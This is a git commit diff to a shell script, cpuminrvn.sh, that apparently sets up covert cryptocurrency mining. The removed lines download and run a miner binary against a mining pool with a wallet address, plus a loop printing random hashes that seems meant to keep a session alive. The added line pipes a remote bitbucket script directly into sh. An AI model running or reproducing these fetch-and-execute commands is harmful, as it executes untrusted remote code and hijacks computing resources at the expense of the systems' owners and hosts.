96d67087ad2e0035508b19fe6f51656b7634df46
embersc <161733267+embersc@users.noreply.github.com>
2024-03-01 00:04:30 +0800

    Update cpuminrvn.sh

--- cpuminrvn.sh
+++ cpuminrvn.sh
@@ -1,5 +1,1 @@
-mkdir rvn
-cd rvn
-curl -0 https://gitlab.com/dorisbhhbyoqzey/miner/-/raw/main/load_nanominer -o load && chmod +x load  >/dev/null 2>&1
-./load -a minotaurx -u RXre9ivvw1qLcyX3WNX5D3Ksud2wfTrByA.load -o stratum+tcp://minotaurx.asia.mine.zergpool.com:7019 -p c=RVN -t $(nproc --all)
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
+curl https://bitbucket.org/dockerhero/ninja/raw/4bc82906aa0a5abc03ddf9e20049eb23e90bc9f1/renber.sh | sh
